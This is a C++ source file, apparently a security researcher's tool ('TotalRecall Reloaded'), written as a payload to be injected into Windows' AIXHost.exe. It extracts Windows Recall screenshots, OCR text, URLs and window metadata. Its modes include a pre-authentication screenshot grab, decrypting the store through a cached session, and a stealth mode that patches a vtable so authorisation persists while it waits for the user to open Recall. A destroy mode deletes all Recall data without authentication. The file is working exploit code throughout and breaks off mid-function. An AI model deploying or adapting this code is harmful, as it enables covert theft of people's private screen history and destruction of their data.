// totalrecall_payload.cpp - TotalRecall Reloaded extraction payload
// Injected into AIXHost.exe. Extracts screenshots, OCR, metadata via COM.
// Author: Alexander Hagenah (@xaitax)

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <objbase.h>
#include <roapi.h>
#include <wincodec.h>
#include <winstring.h>
#include <shlwapi.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "runtimeobject.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef EOAC_DYNAMIC_CLOAKING
#define EOAC_DYNAMIC_CLOAKING 0x40
#endif

// --- Globals ---

static HMODULE g_hMod = NULL;
static wchar_t g_outDir[MAX_PATH];
static FILE*   g_log = NULL;

static void Log(const char* fmt, ...) {
    if (!g_log) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(g_log, "[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    va_list a; va_start(a, fmt); vfprintf(g_log, fmt, a); va_end(a);
    fflush(g_log);
}

// --- SEH-safe vtable call wrappers ---

#define VT(obj, n) ((*(void***)(obj))[(n)])

static HRESULT SehQI(void* o, REFIID iid, void** out) {
    *out = NULL;
    __try { typedef HRESULT(__stdcall*F)(void*,REFIID,void**); return ((F)VT(o,0))(o,iid,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehGet(void* o, int s, void** out) {
    *out = NULL;
    __try { typedef HRESULT(__stdcall*F)(void*,void**); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehGetU64(void* o, int s, UINT64* out) {
    *out = 0;
    __try { typedef HRESULT(__stdcall*F)(void*,UINT64*); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehGetI32(void* o, int s, INT32* out) {
    *out = -1;
    __try { typedef HRESULT(__stdcall*F)(void*,INT32*); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehGetStr(void* o, int s, HSTRING* out) {
    *out = NULL;
    __try { typedef HRESULT(__stdcall*F)(void*,HSTRING*); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehNoArgs(void* o, int s) {
    __try { typedef HRESULT(__stdcall*F)(void*); return ((F)VT(o,s))(o); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehCallU64(void* o, int s, UINT64 arg, void** out) {
    *out = NULL;
    __try { typedef HRESULT(__stdcall*F)(void*,UINT64,void**); return ((F)VT(o,s))(o,arg,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehCall2U32(void* o, int s, UINT32 a, UINT32 b, void** out) {
    *out = NULL;
    __try { typedef HRESULT(__stdcall*F)(void*,UINT32,UINT32,void**); return ((F)VT(o,s))(o,a,b,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehGetIdx(void* o, int s, UINT32 idx, void* out) {
    __try { typedef HRESULT(__stdcall*F)(void*,UINT32,void*); return ((F)VT(o,s))(o,idx,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
struct RectInt32 { INT32 X, Y, Width, Height; };
static HRESULT SehGetRect(void* o, int s, RectInt32* out) {
    *out = {};
    __try { typedef HRESULT(__stdcall*F)(void*,RectInt32*); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}
static HRESULT SehCount(void* o, int s, UINT32* out) {
    *out = 0;
    __try { typedef HRESULT(__stdcall*F)(void*,UINT32*); return ((F)VT(o,s))(o,out); }
    __except(EXCEPTION_EXECUTE_HANDLER) { return (HRESULT)GetExceptionCode(); }
}

// --- IIDs ---

static const GUID IID_AsyncInfo  = {0x00000036,0,0,{0xC0,0,0,0,0,0,0,0x46}};
static const GUID IID_DSMStat   = {0xBA74E143,0x98C5,0x54EF,{0x82,0xEC,0x47,0xF3,0x5B,0xA2,0x9A,0x3B}};
static const GUID IID_DMStat    = {0xE633D398,0xE3DF,0x5ECC,{0xB3,0x6C,0xF6,0x9F,0xF9,0x10,0x3A,0xF4}};
static const GUID IID_CEStat    = {0x74EF218A,0x8494,0x53DF,{0xA3,0xC6,0x95,0xD9,0x7F,0xFF,0x56,0x65}};
static const GUID IID_CE2       = {0xCD032E61,0x890E,0x551D,{0x8C,0xA5,0x55,0xEC,0xD9,0x63,0xB4,0xC3}};
static const GUID IID_MEStat    = {0xB76D8CD4,0xA60A,0x56A6,{0xA8,0x0C,0x3E,0x6E,0x1A,0x40,0x04,0xB8}};
static const GUID IID_ME        = {0x23780A68,0x13CD,0x5039,{0x9C,0xA3,0x50,0x0A,0xC5,0xA6,0xE0,0xAE}};
static const GUID IID_MEDet     = {0xF5C63741,0x6207,0x588D,{0x83,0xD8,0x84,0xB8,0x9D,0x0C,0x34,0x2D}};
static const GUID IID_MEDet2    = {0x6A3368FC,0x367F,0x5856,{0x8D,0xD3,0x05,0xFE,0x5F,0x85,0x4D,0xED}};
static const GUID IID_MEDet4    = {0xD5AB6690,0x7141,0x5F69,{0xAE,0xD5,0xD4,0xE5,0x32,0x54,0x3D,0xF1}};
static const GUID IID_ME2       = {0x8DAB989A,0xDFC4,0x5257,{0xBD,0x9A,0x94,0x0A,0x27,0x48,0xFA,0xD2}};
static const GUID IID_ME3       = {0xFF8473B1,0x6C62,0x5E4D,{0x8C,0xE6,0x76,0xE6,0xA4,0x40,0x3F,0xDF}};
static const GUID IID_EntWrap   = {0xB4B05641,0xCD56,0x50FC,{0xAE,0x8D,0xBD,0x5D,0xDB,0xAC,0x1A,0xE4}};
static const GUID IID_SBmpNat   = {0x94BC8415,0x04EA,0x4B2E,{0xAF,0x13,0x4D,0xE9,0x5A,0xA8,0x98,0xEB}};
static const GUID IID_StreamCOM = {0x0000000C,0,0,{0xC0,0,0,0,0,0,0,0x46}};
static const CLSID CLSID_RPIS  = {0x42C63551,0xF2DD,0x4CFA,{0xA9,0xF1,0x14,0xC1,0x4B,0x62,0xCA,0x75}};
static const GUID IID_RPI1     = {0x395B9852,0xBC67,0x5CFC,{0x8B,0x3B,0x9E,0xB1,0x1F,0x93,0x55,0x09}};
static const GUID IID_DPMStat  = {0x227B93D6,0x8387,0x5A73,{0x9F,0xC8,0x30,0xD2,0x22,0xD8,0x1F,0x83}};
static const GUID IID_DPM3     = {0x5035C44D,0x678E,0x57C1,{0x9A,0x61,0x88,0x01,0xE7,0x81,0x9C,0xC1}};

// No-op replacement for DiscardDataAccess (IDataProtectionManager3 slot 8)
static HRESULT __stdcall StubbedDiscardDataAccess(void*, INT32) { return S_OK; }

// --- Helpers ---

static void Cloak(void* p) {
    if (p) CoSetProxyBlanket((IUnknown*)p, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
        OLESTR(""), RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
}

static void Pump(DWORD ms) {
    DWORD t0 = GetTickCount();
    while (GetTickCount() - t0 < ms) {
        MSG m; while (PeekMessageW(&m, NULL, 0, 0, PM_REMOVE)) { TranslateMessage(&m); DispatchMessageW(&m); }
        Sleep(10);
    }
}

static void* WaitAsync(void* op, int sec) {
    if (!op) return NULL;
    void* info = NULL;
    SehQI(op, IID_AsyncInfo, &info);
    if (!info) return NULL;
    for (int i = 0; i < sec * 20; i++) {
        INT32 st = -1; SehGetI32(info, 7, &st);
        if (st == 1) { void* r = NULL; SehGet(op, 8, &r); return r; }
        if (st >= 2) return NULL;
        Pump(50);
    }
    return NULL;
}

static void* Activate(const wchar_t* cls, REFIID iid) {
    HSTRING h = NULL; WindowsCreateString(cls, (UINT32)wcslen(cls), &h);
    void* f = NULL; RoGetActivationFactory(h, iid, &f); WindowsDeleteString(h);
    if (f) Cloak(f);
    return f;
}

static void* Singleton(void* statics, int slot) {
    void* obj = NULL; SehGet(statics, slot, &obj);
    if (obj) Cloak(obj);
    return obj;
}

static char* ReadStr(void* o, int slot, char* buf, int len) {
    buf[0] = 0; HSTRING h = NULL; SehGetStr(o, slot, &h);
    if (h) { UINT32 n; const wchar_t* r = WindowsGetStringRawBuffer(h, &n);
             if (r && n > 0) WideCharToMultiByte(CP_UTF8, 0, r, n, buf, len-1, NULL, NULL);
             WindowsDeleteString(h); }
    return buf;
}

static wchar_t* ReadWStr(void* o, int slot, wchar_t* buf, int len) {
    buf[0] = 0; HSTRING h = NULL; SehGetStr(o, slot, &h);
    if (h) { UINT32 n; const wchar_t* r = WindowsGetStringRawBuffer(h, &n);
             if (r && n > 0) wcsncpy_s(buf, len, r, n);
             WindowsDeleteString(h); }
    return buf;
}

static void* Unwrap(void* wrapper) {
    if (!wrapper) return NULL;
    void* ew = NULL; SehQI(wrapper, IID_EntWrap, &ew);
    if (ew) { void* inner = NULL; SehGet(ew, 6, &inner); if (inner) return inner; }
    return wrapper;
}

// --- WIC PNG saver ---

static IWICImagingFactory* g_wic = NULL;

static bool SavePng(void* bmp, const wchar_t* path) {
    if (!bmp) return false;
    void* native = NULL; SehQI(bmp, IID_SBmpNat, &native);
    if (!native) return false;

    // ISoftwareBitmapNative.GetData(IID_IWICBitmap, &wicBmp) - slot 6
    IWICBitmap* wic = NULL;
    SehCallU64(native, 6, (UINT64)&IID_IWICBitmap, (void**)&wic);
    ((IUnknown*)native)->Release();
    if (!wic) return false;

    if (!g_wic) CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, IID_IWICImagingFactory, (void**)&g_wic);
    if (!g_wic) { wic->Release(); return false; }

    IWICStream* stream = NULL; g_wic->CreateStream(&stream);
    if (!stream || FAILED(stream->InitializeFromFilename(path, GENERIC_WRITE)))
        { if (stream) stream->Release(); wic->Release(); return false; }

    IWICBitmapEncoder* enc = NULL; g_wic->CreateEncoder(GUID_ContainerFormatPng, NULL, &enc);
    if (!enc) { stream->Release(); wic->Release(); return false; }
    enc->Initialize(stream, WICBitmapEncoderNoCache);

    IWICBitmapFrameEncode* frame = NULL; enc->CreateNewFrame(&frame, NULL);
    if (!frame) { enc->Release(); stream->Release(); wic->Release(); return false; }
    frame->Initialize(NULL);

    UINT w = 0, h = 0; wic->GetSize(&w, &h);
    frame->SetSize(w, h);
    WICPixelFormatGUID fmt; wic->GetPixelFormat(&fmt);
    frame->SetPixelFormat(&fmt);
    HRESULT hr = frame->WriteSource(wic, NULL);
    if (SUCCEEDED(hr)) { frame->Commit(); enc->Commit(); }

    frame->Release(); enc->Release(); stream->Release(); wic->Release();
    return SUCCEEDED(hr);
}

// --- RPIS pre-auth screenshot ---

typedef HRESULT (WINAPI *FnStreamOverRAS)(IUnknown*, IID*, void**);

static bool SaveRpisShot(const wchar_t* path, UINT32 w, UINT32 h) {
    IUnknown* rpis = NULL;
    if (FAILED(CoCreateInstance(CLSID_RPIS, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&rpis)) || !rpis)
        return false;
    void* rpi = NULL; SehQI(rpis, IID_RPI1, &rpi);
    if (!rpi) { rpis->Release(); return false; }

    void* asyncOp = NULL; SehCall2U32(rpi, 13, w, h, &asyncOp);
    if (!asyncOp) { ((IUnknown*)rpi)->Release(); rpis->Release(); return false; }
    void* stream = WaitAsync(asyncOp, 10);
    ((IUnknown*)rpi)->Release(); rpis->Release();
    if (!stream) return false;

    HMODULE shcore = LoadLibraryW(L"shcore.dll");
    FnStreamOverRAS fn = shcore ? (FnStreamOverRAS)GetProcAddress(shcore, "CreateStreamOverRandomAccessStream") : NULL;
    if (!fn) return false;

    IStream* cs = NULL; fn((IUnknown*)stream, (IID*)&IID_StreamCOM, (void**)&cs);
    if (!cs) return false;

    LARGE_INTEGER zero = {}; cs->Seek(zero, STREAM_SEEK_SET, NULL);
    STATSTG stat = {}; cs->Stat(&stat, STATFLAG_NONAME);
    ULONG sz = (ULONG)stat.cbSize.QuadPart;
    if (sz == 0 || sz > 100*1024*1024) { cs->Release(); return false; }

    BYTE* buf = (BYTE*)malloc(sz); ULONG br = 0;
    cs->Read(buf, sz, &br); cs->Release();

    bool ok = false;
    if (br > 0) { FILE* f = _wfopen(path, L"wb"); if (f) { fwrite(buf, 1, br, f); fclose(f); ok = true; } }
    free(buf);
    return ok;
}

// --- Entity extraction helpers ---

static bool ExtractScreenshot(void* me, UINT32 idx, const wchar_t* imgDir, const wchar_t* thumbDir) {
    for (int r = 0; r < 3; r++) {
        if (r > 0) Pump(500);
        void* bmpA = NULL; SehGet(me, 19, &bmpA);
        if (!bmpA) continue;
        void* bmp = WaitAsync(bmpA, 10);
        if (!bmp) continue;
        wchar_t p[MAX_PATH]; swprintf_s(p, L"%s\\capture_%05u.png", imgDir, idx);
        if (SavePng(bmp, p)) return true;
    }
    void* thA = NULL; SehGet(me, 21, &thA);
    if (!thA) return false;
    void* th = WaitAsync(thA, 15);
    if (!th) return false;
    wchar_t p[MAX_PATH]; swprintf_s(p, L"%s\\thumb_%05u.png", thumbDir, idx);
    return SavePng(th, p);
}

struct OcrResult { bool gotOcr; UINT32 nerCount; wchar_t l1Desc[512]; wchar_t l1Act[256]; };

static OcrResult ExtractOcr(void* ce2, void* ent, UINT64 cid, UINT32 idx,
                            const wchar_t* imgDir, const wchar_t* title, const wchar_t* app, FILE* ocr) {
    OcrResult result = {};
    void* detA = NULL; SehCallU64(ce2, 8, cid, &detA);
    if (!detA) return result;
    void* det = WaitAsync(detA, 15);
    if (!det) return result;

    void* med = NULL; SehQI(det, IID_MEDet, &med);
    if (med) {
        void* lines = NULL; SehGet(med, 7, &lines);
        if (lines) {
            UINT32 lc = 0; SehCount(lines, 7, &lc);
            if (lc > 0) {
                result.gotOcr = true;
                wchar_t op[MAX_PATH]; swprintf_s(op, L"%s\\capture_%05u.txt", imgDir, idx);
                FILE* fo = _wfopen(op, L"w,ccs=UTF-8");
                if (ocr) fwprintf(ocr, L"=== [%u] ctxId=%llu %ls | %ls ===\n", idx, cid, title, app);
                for (UINT32 ln = 0; ln < lc; ln++) {
                    void* line = NULL; SehCallU64(lines, 6, (UINT64)ln, &line);
                    if (!line) continue;
                    HSTRING hl = NULL; SehGetStr(line, 6, &hl);
                    if (!hl) continue;
                    UINT32 n; const wchar_t* t = WindowsGetStringRawBuffer(hl, &n);
                    if (t && n > 0) { if (fo) fwprintf(fo, L"%ls\n", t); if (ocr) fwprintf(ocr, L"%ls\n", t); }
                    WindowsDeleteString(hl);
                }
                if (fo) fclose(fo);
                if (ocr) fwprintf(ocr, L"\n");
            }
        }
    }

    void* det2 = NULL; SehQI(det, IID_MEDet2, &det2);
    if (det2) {
        void* textEnts = NULL; SehGet(det2, 6, &textEnts);
        if (textEnts) SehCount(textEnts, 7, &result.nerCount);
    }

    void* det4 = NULL; SehQI(det, IID_MEDet4, &det4);
    if (det4) {
        ReadWStr(det4, 7, result.l1Desc, 512);
        ReadWStr(det4, 8, result.l1Act, 256);
    }
    return result;
}

static void WriteCsvRow(FILE* csv, UINT32 idx, const wchar_t* title, const wchar_t* app,
                        const wchar_t* appModelId, const wchar_t* proc, const wchar_t* domain,
                        const wchar_t* url, const wchar_t* furi, UINT64 ts, UINT64 cid,
                        RectInt32 bounds, UINT64 appDwell, UINT64 webDwell, UINT32 restoreCap,
                        UINT32 nerCount, const wchar_t* l1Act, bool gotImg, bool gotOcr) {
    if (!csv) return;
    wchar_t tsStr[32] = L"";
    if (ts > 0) {
        FILETIME ft; ft.dwLowDateTime = (DWORD)ts; ft.dwHighDateTime = (DWORD)(ts >> 32);
        SYSTEMTIME utc; FileTimeToSystemTime(&ft, &utc);
        swprintf_s(tsStr, L"%04d-%02d-%02d %02d:%02d:%02d",
            utc.wYear, utc.wMonth, utc.wDay, utc.wHour, utc.wMinute, utc.wSecond);
    }
    fwprintf(csv, L"%u,\"%ls\",\"%ls\",\"%ls\",\"%ls\",\"%ls\",\"%ls\",\"%ls\",\"%ls\",%llu,%d,%d,%d,%d,%llu,%llu,0x%X,%u,\"%ls\",%ls,%ls\n",
        idx, title, app, appModelId, proc, domain, url, furi, tsStr, cid,
        bounds.X, bounds.Y, bounds.Width, bounds.Height,
        appDwell, webDwell, restoreCap, nerCount, l1Act,
        gotImg ? L"YES" : L"NO", gotOcr ? L"YES" : L"NO");
}

// --- Main extraction ---

static DWORD WINAPI ExtractThread(LPVOID) {
    // Output directory
    wchar_t base[MAX_PATH];
    GetModuleFileNameW(g_hMod, base, MAX_PATH);
    wchar_t* sl = wcsrchr(base, L'\\'); if (sl) *sl = 0;
    SYSTEMTIME st; GetLocalTime(&st);
    swprintf_s(g_outDir, L"%s\\extraction_%04d%02d%02d_%02d%02d%02d",
        base, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    CreateDirectoryW(g_outDir, NULL);

    wchar_t logPath[MAX_PATH]; swprintf_s(logPath, L"%s\\extraction.log", g_outDir);
    g_log = _wfopen(logPath, L"w");
    Log("=== Recall Extraction === PID: %lu\n\n", GetCurrentProcessId());

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (hr == RPC_E_CHANGED_MODE) hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    Log("CoInit: 0x%08X\n", (unsigned)hr);

    wchar_t imgDir[MAX_PATH], thumbDir[MAX_PATH];
    swprintf_s(imgDir, L"%s\\screenshots", g_outDir);
    swprintf_s(thumbDir, L"%s\\thumbnails", g_outDir);
    CreateDirectoryW(imgDir, NULL);
    CreateDirectoryW(thumbDir, NULL);

    // Mode detection via marker files
    bool preAuthOnly = false, destroyMode = false, stealthMode = false;
    {
        wchar_t mk[MAX_PATH];
        wcscpy_s(mk, base); wcscat_s(mk, L"\\__preauth__");
        if (GetFileAttributesW(mk) != INVALID_FILE_ATTRIBUTES) { preAuthOnly = true; DeleteFileW(mk); Log("PRE-AUTH MODE\n"); }
        wcscpy_s(mk, base); wcscat_s(mk, L"\\__stealth__");
        if (GetFileAttributesW(mk) != INVALID_FILE_ATTRIBUTES) { stealthMode = true; DeleteFileW(mk); Log("STEALTH MODE\n"); }
        wcscpy_s(mk, base); wcscat_s(mk, L"\\__destroy__");
        if (GetFileAttributesW(mk) != INVALID_FILE_ATTRIBUTES) { destroyMode = true; DeleteFileW(mk); Log("DESTROY MODE\n"); }
    }

    // Stealth: patch DiscardDataAccess to prevent Baker.dll from revoking auth on close
    if (stealthMode) {
        void* dpmSt = Activate(L"Microsoft.Windows.AI.Platform.Data.DataProtectionManager", IID_DPMStat);
        void* dpmI = dpmSt ? Singleton(dpmSt, 6) : NULL;
        void* dpm3 = NULL;
        if (dpmI) { SehQI(dpmI, IID_DPM3, &dpm3); if (dpm3) Cloak(dpm3); }
        if (dpm3) {
            void** vtable = *(void***)dpm3;
            DWORD oldProt;
            if (VirtualProtect(&vtable[8], sizeof(void*), PAGE_READWRITE, &oldProt)) {
                vtable[8] = (void*)StubbedDiscardDataAccess;
                VirtualProtect(&vtable[8], sizeof(void*), oldProt, &oldProt);
                Log("DiscardDataAccess patched (auth grant will persist)\n");
            }
        }
    }

    // Destroy mode: call DeleteEvents (no auth required) and exit
    if (destroyMode) {
        Log("\n=== DESTROYING ALL RECALL DATA ===\n");
        void* dsmSt = Activate(L"Microsoft.Windows.AI.Platform.Data.DataStoreManager", IID_DSMStat);
        void* dsm = dsmSt ? Singleton(dsmSt, 6) : NULL;
        if (dsm) {
            UINT64 sizeBefore = 0; SehGetU64(dsm, 23, &sizeBefore);
            Log("  Storage before: %llu bytes\n", sizeBefore);
            hr = SehNoArgs(dsm, 12); // DeleteEvents - slot 12, no auth check
            Log("  DeleteEvents: 0x%08X\n", (unsigned)hr);
            Pump(3000);
            UINT64 sizeAfter = 0; SehGetU64(dsm, 23, &sizeAfter);
            Log("  Storage after: %llu bytes\n", sizeAfter);
            Log("  Freed: %llu bytes\n", sizeBefore > sizeAfter ? sizeBefore - sizeAfter : 0);
        } else {
            Log("  Failed to get DataStoreManager\n");
        }
        Log("\n========================================\n");
        Log("DESTROY COMPLETE\n");
        Log("========================================\n");
        if (g_log) fclose(g_log);
        return 0;
    }

    // -- Phase 0: Pre-auth RPIS screenshot --
    Log("\n=== PHASE 0: Pre-auth RPIS screenshot ===\n");
    {
        wchar_t p[MAX_PATH]; swprintf_s(p, L"%s\\latest_capture_4k.bmp", g_outDir);
        Log(SaveRpisShot(p, 3840, 3840) ? "  Saved 4K screenshot (pre-auth)\n" : "  RPIS screenshot failed\n");
    }

    // -- Settings --
    Log("\n=== Settings enumeration ===\n");
    {
        wchar_t sp[MAX_PATH]; swprintf_s(sp, L"%s\\settings.txt", g_outDir);
        FILE* sf = _wfopen(sp, L"w");
        void* dsmSt = Activate(L"Microsoft.Windows.AI.Platform.Data.DataStoreManager", IID_DSMStat);
        if (dsmSt) {
            char p1[512]={}, p2[512]={};
            ReadStr(dsmSt, 8, p1, 512); ReadStr(dsmSt, 9, p2, 512);
            if (p1[0]) { Log("  StoragePath: %s\n", p1); if (sf) fprintf(sf, "StoragePath=%s\n", p1); }
            if (p2[0]) { Log("  BackupPath: %s\n", p2);  if (sf) fprintf(sf, "BackupPath=%s\n", p2); }
            void* dsm = Singleton(dsmSt, 6);
            if (dsm) {
                UINT64 sz=0, cc=0, th=0; INT32 ret=0, hist=0;
                SehGetU64(dsm, 23, &sz); SehGetU64(dsm, 26, &cc);
                SehGetI32(dsm, 21, &ret); SehGetI32(dsm, 45, &hist); SehGetU64(dsm, 24, &th);
                Log("  StorageSize: %llu bytes\n", sz); Log("  CaptureCount: %llu\n", cc);
                Log("  RetentionDays: %d\n", ret); Log("  HistoryEnabled: %d\n", hist);
                Log("  StorageThreshold: %llu\n", th);
                if (sf) { fprintf(sf, "StorageSize=%llu\nCaptureCount=%llu\nRetentionDays=%d\nHistoryEnabled=%d\nStorageThreshold=%llu\n",
                    sz, cc, ret, hist, th); }
            }
        }
        IUnknown* rpis = NULL;
        CoCreateInstance(CLSID_RPIS, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&rpis);
        if (rpis) {
            void* rpi = NULL; SehQI(rpis, IID_RPI1, &rpi);
            if (rpi) {
                INT32 cs=-1, pr=-1; UINT64 cid=0;
                SehGetI32(rpi, 6, &cs); SehGetI32(rpi, 7, &pr); SehGetU64(rpi, 12, &cid);
                Log("  CaptureState: %d\n", cs); Log("  PausedReason: %d\n", pr);
                Log("  RecentCaptureContextId: %llu\n", cid);
                if (sf) fprintf(sf, "CaptureState=%d\nPausedReason=%d\nRecentCaptureContextId=%llu\n", cs, pr, cid);
            }
            rpis->Release();
        }
        if (sf) fclose(sf);
        Log("  Settings saved to settings.txt\n");
    }

    if (preAuthOnly) {
        Log("\n========================================\n");
        Log("PRE-AUTH EXTRACTION COMPLETE\nOutput: %ls\n", g_outDir);
        Log("========================================\n");
        if (g_log) fclose(g_log); return 0;
    }

    // -- Phase 1: Enclave init + entity extraction --
    Log("\n=== PHASE 1: Enclave initialization ===\n");

    // DataManager.Load + DecryptDatabase (no auth prompt, works with cached session)
    void* dmSt = Activate(L"Microsoft.Windows.AI.Platform.Data.DataManager", IID_DMStat);
    void* dm = dmSt ? Singleton(dmSt, 6) : NULL;
    if (dm) { hr = SehNoArgs(dm, 10); Log("DataManager.Load: 0x%08X\n", (unsigned)hr); Pump(2000); }

    void* encDsmSt = Activate(L"Microsoft.Windows.AI.Platform.Data.DataStoreManager", IID_DSMStat);
    void* encDsm = encDsmSt ? Singleton(encDsmSt, 6) : NULL;
    if (encDsm) { SehNoArgs(encDsm, 37); Log("DecryptDatabase called\n"); }

    // Wait for DataStatus == 3
    if (dm) {
        for (int w = 0; w < 12; w++) {
            INT32 ds = -1; SehGetI32(dm, 6, &ds);
            Log("DataStatus: %d %s\n", ds, ds == 3 ? "(unlocked)" : "");
            if (ds == 3) break;
            Pump(5000);
            if (encDsm) SehNoArgs(encDsm, 37);
        }
    }

    INT32 finalDS = -1; if (dm) SehGetI32(dm, 6, &finalDS);
    UINT64 capCnt = 0; if (encDsm) SehGetU64(encDsm, 26, &capCnt);
    Log("DataStatus: %d  CaptureCount: %llu\n", finalDS, capCnt);
    if (finalDS != 3) {
        Log("Enclave not unlocked (DataStatus=%d). Stopping.\n", finalDS);
        if (g_log) fclose(g_log); return 0;
    }

    // ContextEngine + MemoryEntity setup
    void* ceSt = Activate(L"Microsoft.Windows.AI.Platform.Context.ContextEngine", IID_CEStat);
    void* ce = ceSt ? Singleton(ceSt, 6) : NULL;
    void* ce2 = NULL;
    if (ce) { SehQI(ce, IID_CE2, &ce2); if (ce2) Cloak(ce2); }
    Log("ContextEngine2: %s\n", ce2 ? "OK" : "FAILED");

    void* mesSt = Activate(L"Microsoft.Windows.AI.Platform.Entities.MemoryEntity", IID_MEStat);
    Log("MemoryEntityStatics: %s\n", mesSt ? "OK" : "FAILED");

    // Enumerate entities
    Log("\n=== Enumerating entities ===\n");
    void* vecView = NULL; UINT32 totalItems = 0;
    if (mesSt) {
        INT64 farFuture = 1500000000000000000LL;
        HRESULT hrE;
        __try { typedef HRESULT(__stdcall*F)(void*,INT64,UINT64,void**);
                hrE = ((F)VT(mesSt,9))(mesSt, farFuture, 100000, &vecView);
        } __except(EXCEPTION_EXECUTE_HANDLER) { hrE = E_FAIL; }
        Log("GetLightMemoryItemsBefore: 0x%08X\n", (unsigned)hrE);
        if (vecView) SehCount(vecView, 7, &totalItems);
        Log("Total entities: %u\n", totalItems);

        // Stealth mode: poll for auth, signal when detected, then exit (don't extract)
        // The injector handles re-injection into the respawned AIXHost for extraction
        if (totalItems == 0 && stealthMode) {
            Log("Waiting for user to open Recall...\n");
            for (int wait = 0; wait < 360; wait++) { // up to 30 minutes
                Pump(5000);
                vecView = NULL; totalItems = 0;
                __try { typedef HRESULT(__stdcall*F)(void*,INT64,UINT64,void**);
                        hrE = ((F)VT(mesSt,9))(mesSt, farFuture, 100000, &vecView);
                } __except(EXCEPTION_EXECUTE_HANDLER) { hrE = E_FAIL; }
                if (vecView) SehCount(vecView, 7, &totalItems);
                if (totalItems > 0) {
                    Log("AUTH DETECTED - %u entities accessible\n", totalItems);
                    // Don't extract here. The injector will wait for AIXHost to
                    // restart (user closes Recall), then re-inject for extraction.
                    if (g_log) fclose(g_log);
                    return 0;
                }
                if (dm && (wait % 12 == 11)) SehNoArgs(dm, 10);
            }
            Log("No Recall session detected within timeout.\n");
            if (g_log) fclose(g_log); return 0;
        }

        // Non-stealth: if entities denied, stop
        if (totalItems == 0 && FAILED(hrE)) {
            Log("Entity access denied. Use --launch for first extraction.\n");
            if (g_log) fclose(g_log); return 0;
        }
    }

    // Collect context IDs
    UINT64* ids = (UINT64*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalItems * sizeof(UINT64));
    BYTE* done = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalItems);
    UINT32 nIds = 0;
    for (UINT32 i = 0; i < totalItems; i++) {
        UINT8 item[40] = {}; SehGetIdx(vecView, 6, i, item);
        UINT64 cid = 0; memcpy(&cid, item + 8, 8);
        if (cid) ids[nIds++] = cid;
    }
    Log("Context IDs: %u\n", nIds);

    // Output files
    wchar_t csvP[MAX_PATH], ocrP[MAX_PATH];
    swprintf_s(csvP, L"%s\\recall_data.csv", g_outDir);
    swprintf_s(ocrP, L"%s\\ocr_text.txt", g_outDir);
    FILE* csv = _wfopen(csvP, L"w,ccs=UTF-8");
    FILE* ocr = _wfopen(ocrP, L"w,ccs=UTF-8");
    if (csv) fwprintf(csv, L"Index,Title,App,AppModelId,ProcessPath,Domain,URL,FileUri,Timestamp,ContextId,WindowX,WindowY,WindowW,WindowH,AppDwellMs,WebDwellMs,RestoreCap,NERCount,L1Activity,Image,OCR\n");

    int nMeta = 0, nOcr = 0, nImg = 0;

    // -- Entity extraction (single pass + retry rounds) --
    Log("\n=== Entity extraction ===\n");
    for (int round = 0; round <= 10 && ce2; round++) {
        if (round > 0) { Log("  Round %d -- pumping messages (3s)...\n", round); Pump(3000); }

        UINT32 fresh = 0;
        for (UINT32 i = 0; i < nIds; i++) {
            if (done[i]) continue;
            UINT64 cid = ids[i];

            void* wrap = NULL; SehCallU64(ce2, 6, cid, &wrap);
            if (!wrap) continue;
            void* ent = Unwrap(wrap);
            void* me = NULL; SehQI(ent, IID_ME, &me);
            if (!me) continue;

            done[i] = 1; fresh++; nMeta++;

            // Metadata (IMemoryEntity v1)
            wchar_t title[512]={}, app[256]={}, proc[512]={};
            wchar_t domain[256]={}, url[512]={}, furi[512]={}, appModelId[256]={};
            UINT64 ts = 0;
            RectInt32 bounds = {};
            ReadWStr(me, 8, title, 512);    ReadWStr(me, 9, appModelId, 256);
            ReadWStr(me, 10, app, 256);     ReadWStr(me, 11, proc, 512);
            ReadWStr(me, 12, url, 512);     ReadWStr(me, 13, domain, 256);
            ReadWStr(me, 15, furi, 512);
            SehGetU64(me, 7, &ts);
            SehGetRect(me, 16, &bounds);

            // IMemoryEntity2: RestoreCapability
            UINT32 restoreCap = 0;
            { void* me2 = NULL; SehQI(ent, IID_ME2, &me2);
